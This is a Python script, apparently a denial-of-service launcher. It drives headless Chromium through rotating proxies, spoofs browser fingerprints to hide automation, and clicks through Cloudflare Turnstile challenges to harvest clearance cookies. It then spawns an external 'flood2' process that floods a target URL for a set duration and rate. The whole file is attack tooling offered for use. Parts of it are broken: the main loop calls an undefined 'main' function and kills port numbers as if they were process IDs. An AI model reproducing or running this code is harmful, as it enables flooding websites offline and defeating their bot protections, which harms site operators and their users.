#!/usr/bin/env python3
import random
import string
import subprocess
import json
import sys
import threading
import time
import re
import os
import signal
import psutil
import concurrent.futures
import logging
from itertools import cycle
from uuid import uuid4
from DrissionPage import ChromiumPage, ChromiumOptions
from DrissionPage.common import Settings

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Constants
CONFIG = {
    "USER_AGENTS": [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{v}.0) Gecko/20100101 Tor/{v}.0"
        for v in range(119, 136)
    ],
    "WINDOW_SIZES": [(1366, 768), (1440, 900), (1920, 1080), (1280, 800)],
    "PORT_RANGE": range(9000, 9245),
    "CHROME_ARGS": [
        '--headless=new', '--no-sandbox', '--disable-field-trial-config',
        '--disable-background-networking', '--enable-features=NetworkService,NetworkServiceInProcess',
        '--disable-background-timer-throttling', '--disable-backgrounding-occluded-windows',
        '--disable-back-forward-cache', '--disable-breakpad', '--disable-application-cache',
        '--disable-client-side-phishing-detection', '--disable-component-extensions-with-background-pages',
        '--disable-default-apps', '--disable-dev-shm-usage', '--disable-extensions',
        '--disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,DestroyProfileOnBrowserClose,MediaRouter,DialMediaRouteProvider,AcceptCHFrame,AutoExpandDetailsElement,CertificateTransparencyComponentUpdater,AvoidUnnecessaryBeforeUnloadCheckSync,Translate,HttpsUpgrades,PaintHolding,SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure',
        '--allow-pre-commit-input', '--disable-ipc-flooding-protection', '--disable-popup-blocking',
        '--disable-prompt-on-repost', '--disable-renderer-backgrounding', '--force-color-profile=srgb',
        '--metrics-recording-only', '--use-mock-keychain', '--no-service-autorun',
        '--export-tagged-pdf', '--disable-search-engine-choice-screen', '--flag-switches-begin',
        '--enable-quic', '--enable-features=PostQuantumKyber', '--flag-switches-end',
        '--ignore-certificate-errors', '--ignore-ssl-errors', '--tls-min-version=1.2',
        '--tls-max-version=1.3', '--ssl-version-min=tls1.2', '--ssl-version-max=tls1.3',
        '--disable-blink-features=AutomationControlled', '--disable-infobars',
        '--disable-features=IsolateOrigins,site-per-process'
    ],
    "BROWSER_PATH": './ungoogled-chromium_131.0.6778.85-1.AppImage'
}

# Global state
assigned_ports = set()
used_proxies = set()
drivers = []
shutdown_event = threading.Event()
total_solved = 0
counter_lock = threading.Lock()

def generate_random_string(min_length: int, max_length: int) -> str:
    """Generate a random string of specified length."""
    characters = string.ascii_letters + string.digits
    length = random.randint(min_length, max_length)
    return ''.join(random.choice(characters) for _ in range(length))

def generate_fingerprint() -> dict:
    """Generate a browser fingerprint with randomized attributes."""
    user_agent = random.choice(CONFIG["USER_AGENTS"])
    return {
        "User-Agent": user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-US,en;q=0.7"]),
        "Upgrade-Insecure-Requests": "1",
        "Sec-CH-UA": '"Chromium";v="133", " Not A;Brand";v="24", "Google Chrome";v="133"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"'
    }

def generate_headers() -> dict:
    """Generate legitimate HTTP headers based on fingerprint."""
    fp = generate_fingerprint()
    return {
        "User-Agent": fp["User-Agent"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": fp["Accept-Language"],
        "Accept-Encoding": fp["Accept-Encoding"],
        "Upgrade-Insecure-Requests": fp["Upgrade-Insecure-Requests"],
        "Sec-CH-UA": fp.get("Sec-CH-UA", ""),
        "Sec-CH-UA-Mobile": fp.get("Sec-CH-UA-Mobile", ""),
        "Sec-CH-UA-Platform": fp.get("Sec-CH-UA-Platform", ""),
        "Cache-Control": "max-age=0",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1"
    }

def apply_fingerprint(driver: ChromiumPage, fingerprint: dict) -> None:
    """Apply browser fingerprint to spoof detection mechanisms."""
    script = """
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
    Object.defineProperty(navigator, 'plugins', {
        get: () => [ { name: "Chrome PDF Plugin" }, { name: "Chrome PDF Viewer" }, { name: "Native Client" } ]
    });
    Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
    Object.defineProperty(navigator, 'vendor', { get: () => 'Google Inc.' });
    Object.defineProperty(navigator, 'product', { get: () => 'Gecko' });
    if (!window.chrome) {
        window.chrome = {
            runtime: {},
            app: { isInstalled: false },
            webstore: { onInstallStageChanged: null, onDownloadProgress: null },
            csi: function() {},
            loadTimes: function() { return { firstPaintAfterLoadTime: Date.now() / 1000 }; }
        };
    }
    if (window.chrome && window.chrome.runtime) {
        delete window.chrome.runtime;
    }
    const originalQuery = window.navigator.permissions.query;
    window.navigator.permissions.query = (parameters) => (
      parameters.name === 'notifications' ?
        Promise.resolve({ state: Notification.permission }) :
        originalQuery(parameters)
    );
    const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function() {
        return originalToDataURL.apply(this, arguments);
    };
    const getParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(parameter) {
      if (parameter === this.VENDOR) return 'Google Inc.';
      if (parameter === this.RENDERER) return 'ANGLE (Intel(R) HD Graphics 520 Direct3D11 vs_5_0)';
      return getParameter.call(this, parameter);
    };
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 4 });
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
    """
    try:
        driver.run_js(script)
        logger.info("Applied browser fingerprint successfully")
    except Exception as e:
        logger.warning(f"Failed to apply fingerprint: {e}")

def kill_port(port: int) -> None:
    """Kill processes using the specified port."""
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            if 'chrome' in proc.info['name'].lower() or 'chromium' in proc.info['name'].lower():
                cmdline = proc.info.get('cmdline', [])
                if any(f'--remote-debugging-port={port}' in arg for arg in cmdline):
                    logger.info(f"Killing Chrome/Chromium process (PID: {proc.pid}) on port {port}")
                    os.kill(proc.pid, signal.SIGKILL)
    except Exception as e:
        logger.error(f"Error killing port {port}: {e}")

def setup_driver(proxy: str, port: int) -> tuple[ChromiumPage, str]:
    """Set up a Chromium driver with proxy and fingerprint."""
    kill_port(port)
    co = ChromiumOptions()
    co.auto_port(True)
    for arg in CONFIG["CHROME_ARGS"]:
        co.set_argument(arg)
    
    width, height = random.choice(CONFIG["WINDOW_SIZES"])
    co.set_argument(f'--window-size={width},{height}')
    
    fingerprint = generate_fingerprint()
    co.set_user_agent(fingerprint["User-Agent"])
    co.set_browser_path(CONFIG["BROWSER_PATH"])
    co.set_proxy(proxy)
    co.incognito(True)
    
    driver = ChromiumPage(addr_or_opts=co)
    driver.set_headers(generate_headers())
    apply_fingerprint(driver, fingerprint)
    
    return driver, fingerprint["User-Agent"]

def wait_for_cloudflare_cookie(driver: ChromiumPage, max_timeout: int = 15) -> str:
    """Wait for Cloudflare cookies to be set."""
    start = time.time()
    while time.time() - start < max_timeout:
        cookies = driver.cookies()
        cookie_string = "; ".join(f"{c['name']}={c['value']}" for c in cookies)
        if any('cf_clearance' in c['name'] and len(c['value'].strip()) > 10 for c in cookies):
            return cookie_string
        time.sleep(0.1)
    return ""

def simulate_human_click(driver: ChromiumPage, element, max_attempts: int = 5) -> bool:
    """Simulate human-like clicking on an element."""
    if not element:
        logger.error("No element provided for clicking")
        return False
    
    try:
        # Get element bounding box
        bbox = element.run_js("""
            if (typeof this.getBoundingClientRect === 'function') {
                var r = this.getBoundingClientRect();
                return { x: r.x, y: r.y, width: r.width, height: r.height };
            }
            return null;
        """)
        if not bbox or bbox['width'] <= 0 or bbox['height'] <= 0:
            logger.debug("Invalid bounding box for element")
            return False
        
        # Simulate mouse movement and click
        script = """
            function simulateClick(x, y) {
                var evt = new MouseEvent('click', {
                    bubbles: true,
                    cancelable: true,
                    view: window,
                    clientX: x,
                    clientY: y
                });
                document.elementFromPoint(x, y).dispatchEvent(evt);
            }
            simulateClick(arguments[0], arguments[1]);
        """
        # Randomize click position within the element
        x = bbox['x'] + random.uniform(0.2 * bbox['width'], 0.8 * bbox['width'])
        y = bbox['y'] + random.uniform(0.2 * bbox['height'], 0.8 * bbox['height'])
        
        for attempt in range(max_attempts):
            driver.run_js(script, x, y)
            time.sleep(random.uniform(0.05, 0.15))
            # Check if the click was successful (e.g., element state changed)
            response = driver.run_js("try { return turnstile.getResponse() } catch(e) { return null }")
            if response:
                logger.debug(f"Turnstile response received after click attempt {attempt + 1}: {response}")
                return True
        logger.debug("No Turnstile response after max click attempts")
        return False
    except Exception as e:
        logger.error(f"Error simulating click: {e}")
        return False

def solve_captcha(driver: ChromiumPage, max_tries: int = 20, timeout: int = 5) -> bool:
    """Attempt to automatically solve Cloudflare Turnstile captcha."""
    selectors = {
        "turnstile_widget": [
            "div.cf-turnstile", "#cf-turnstile", "[data-cf-turnstile]",
            "input[name='cf-turnstile-response']", ".cf-turnstile-input"
        ],
        "iframe": [
            "tag:iframe", "iframe.cf-challenge", "iframe[title*='challenge']",
            "div > iframe", ".cf-iframe"
        ],
        "checkbox": [
            "input[type='checkbox']", ".cf-turnstile-checkbox",
            "input[role='checkbox']", "div.cf-turnstile-checkbox"
        ]
    }
    
    for attempt in range(max_tries):
        try:
            # Check for Turnstile widget presence
            turnstile_widget = None
            for sel in selectors["turnstile_widget"]:
                widget = driver.ele(sel)
                if widget:
                    turnstile_widget = widget
                    logger.debug(f"Found Turnstile widget with selector: {sel}")
                    break
            
            if not turnstile_widget:
                # Check if Turnstile is embedded via JavaScript
                turnstile_present = driver.run_js("return typeof turnstile !== 'undefined' && turnstile.getResponse !== undefined;")
                if not turnstile_present:
                    logger.debug("No Turnstile widget or script detected")
                    return True  # No captcha present, assume success
            
            # Locate the iframe containing the Turnstile challenge
            iframe = None
            for sel in selectors["iframe"]:
                iframe = (turnstile_widget.shadow_root if turnstile_widget else driver).ele(sel)
                if iframe:
                    logger.debug(f"Found Turnstile iframe with selector: {sel}")
                    break
            if not iframe:
                logger.error("Could not find Turnstile iframe")
                return False
            
            # Locate the checkbox or interactive element within the iframe
            checkbox = None
            for sel in selectors["checkbox"]:
                checkbox = iframe.ele(sel)
                if checkbox:
                    logger.debug(f"Found Turnstile checkbox with selector: {sel}")
                    break
            if not checkbox:
                logger.error("Could not find Turnstile checkbox")
                return False
            
            # Simulate human-like click
            if simulate_human_click(driver, checkbox):
                # Verify if the captcha was solved
                response = driver.run_js("try { return turnstile.getResponse() } catch(e) { return null }")
                if response:
                    logger.info("Turnstile captcha solved successfully")
                    return True
                
                # Check if the challenge page is gone
                if 'challenges.cloudflare.com' not in driver.html:
                    logger.info("Turnstile challenge page cleared")
                    return True
            
            # Exponential backoff for retries
            time.sleep(min(0.5 * (1.5 ** attempt), 2.0))
        
        except Exception as e:
            logger.debug(f"Error during Turnstile solve attempt {attempt + 1}: {e}")
    
    logger.error("Failed to solve Turnstile captcha after max tries")
    
    # Placeholder for external captcha-solving service (e.g., 2Captcha)
    """
    try:
        # Example: Integrate with 2Captcha or similar service
        # from twocaptcha import TwoCaptcha
        # solver = TwoCaptcha('YOUR_API_KEY')
        # sitekey = driver.run_js("return document.querySelector('.cf-turnstile').getAttribute('data-sitekey');")
        # result = solver.turnstile(sitekey=sitekey, url=driver.url)
        # driver.run_js(f"turnstile.execute('{result['code']}');")
        # logger.info("Turnstile solved via external service")
        # return True
    except Exception as e:
        logger.error(f"External captcha solver failed: {e}")
    """
    
    return False

def solve(proxy: str, url: str, duration: int, rate: int, port: int, optional_args: list) -> None:
    """Main logic to solve Cloudflare challenge and execute flood command."""
    global total_solved
    driver, user_agent = setup_driver(proxy, port)
    start_time = time.time()
    
    with counter_lock:
        drivers.append(driver)
    
    try:
        driver.get(url, timeout=15, retry=2)
        logger.info(f"Proxy {proxy} connected. Waiting for page load")
        time.sleep(random.uniform(5, 9))
        
        if 'Attention Required! | Cloudflare' in driver.title:
            logger.info("Blocked by Cloudflare")
            return
        
        if 'challenges.cloudflare.com' in driver.html or driver.run_js("return typeof turnstile !== 'undefined';"):
            logger.info(f"Proxy {proxy} attempting to solve Cloudflare Turnstile challenge")
            if solve_captcha(driver):
                cookies = wait_for_cloudflare_cookie(driver)
                if cookies:
                    referer = driver.run_js("return document.referrer;") or ""
                    execution_time = time.time() - start_time
                    with counter_lock:
                        total_solved += 1
                    data = {
                        "page_title": driver.title,
                        "proxy_address": proxy,
                        "cookie_found": cookies,
                        "page_referer": referer,
                        "user-agent": user_agent,
                        "execution_time": execution_time,
                        "total_solved": total_solved
                    }
                    logger.info(f"Proxy {proxy} bypassed successfully: {json.dumps(data, indent=4)}")
                    
                    flood_command = [
                        'node', 'flood2', url, str(duration), '2', proxy, str(rate),
                        cookies, user_agent, generate_random_string(5, 10)
                    ]
                    flood_command.extend(optional_args)
                    logger.info(f"Running flood command: {' '.join(flood_command)}")
                    subprocess.Popen(flood_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    
                    with open("cookie.txt", "a") as f:
                        f.write(f"{proxy}|{cookies}|{user_agent}\n")
    except Exception as e:
        logger.error(f"Error with proxy {proxy}: {e}")
    finally:
        with counter_lock:
            if driver in drivers:
                drivers.remove(driver)
            if port in assigned_ports:
                assigned_ports.remove(port)
        try:
            driver.quit()
        except Exception:
            pass

def close_all_drivers() -> None:
    """Close all open drivers and free ports."""
    with counter_lock:
        for driver in drivers[:]:
            try:
                driver.quit()
                drivers.remove(driver)
            except Exception:
                pass
        for port in assigned_ports:
            try:
                os.kill(port, signal.SIGKILL)
            except OSError:
                pass
        assigned_ports.clear()

def signal_handler(sig, frame) -> None:
    """Handle termination signals."""
    logger.info("Received termination signal. Cleaning up...")
    close_all_drivers()
    os.system('pkill -f flood2')
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) < 6:
        logger.error("Usage: python3 flug_optimized_with_turnstile.py <target> <time> <thread_count> <rate> <proxy_file> [--query true/false --post true/false --randuser true/false]")
        sys.exit(1)
    
    url = sys.argv[1]
    duration = int(sys.argv[2])
    thread_count = int(sys.argv[3])
    rate = int(sys.argv[4])
    proxy_file = sys.argv[5]
    optional_args = sys.argv[6:]
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    start_time = time.time()
    try:
        with open(proxy_file, "r") as f:
            proxies = f.read().splitlines()
        random.shuffle(proxies)
        ports = cycle(CONFIG["PORT_RANGE"])
        
        while time.time() - start_time < duration and not shutdown_event.is_set():
            available_proxies = [p for p in proxies if p not in used_proxies]
            if not available_proxies:
                used_proxies.clear()
                available_proxies = proxies[:]
                random.shuffle(available_proxies)
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
                futures = [
                    executor.submit(main, proxy, url, duration, rate, optional_args)
                    for proxy in available_proxies
                ]
                used_proxies.update(available_proxies)
                for future in concurrent.futures.as_completed(futures):
                    try:
                        future.result()
                    except Exception:
                        pass
    except Exception as e:
        logger.error(f"Main loop error: {e}")
    finally:
        close_all_drivers()